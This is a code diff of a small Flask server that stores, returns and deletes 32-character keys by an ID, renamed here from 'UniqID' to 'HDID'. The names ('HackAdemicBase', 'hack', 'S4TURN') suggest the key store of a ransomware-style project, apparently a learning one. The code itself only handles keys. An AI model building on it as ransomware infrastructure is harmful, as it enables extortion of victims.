@@ -11,7 +11,7 @@ db = sqlite3.connect('HackAdemicBase.db', check_same_thread=False)
 
 db.cursor().execute('''CREATE table if not exists hack(
                         ID integer primary key AUTOINCREMENT,
-                        UniqID text,
+                        HDID text,
                         Key string(32)
                         )
                     ''')
@@ -23,7 +23,7 @@ db.commit()
 def save_key():
     cur = db.cursor()
     try:
-        cur.execute("INSERT INTO hack (UniqID, Key) VALUES (?,?) ", [request.form['UniqID'], request.form['Key']])
+        cur.execute("INSERT INTO hack (HDID, Key) VALUES (?,?) ", [request.form['HDID'], request.form['Key']])
     except KeyError:
         print('S4TURN sent empty message')
         return 'Plaki Plaki', HTTPStatus.BAD_REQUEST
@@ -35,7 +35,7 @@ def save_key():
 def get_key():
     cur = db.cursor()
     try:
-        result = cur.execute("SELECT Key FROM hack WHERE UniqID = ? ", [request.form['UniqID']]).fetchone()
+        result = cur.execute("SELECT Key FROM hack WHERE HDID = ? ", [request.form['HDID']]).fetchone()
     except KeyError:
         print('Chelik ne polychit klyuch')
         return 'Sho delat', HTTPStatus.BAD_REQUEST
@@ -52,7 +52,7 @@ def get_key():
 def delete_key():
     cur = db.cursor()
     try:
-        cur.execute("DELETE FROM hack WHERE UniqID = ? ", [request.form['UniqID']])
+        cur.execute("DELETE FROM hack WHERE HDID = ? ", [request.form['HDID']])
         db.commit()
     except KeyError:
         print('che ti nesesh?')
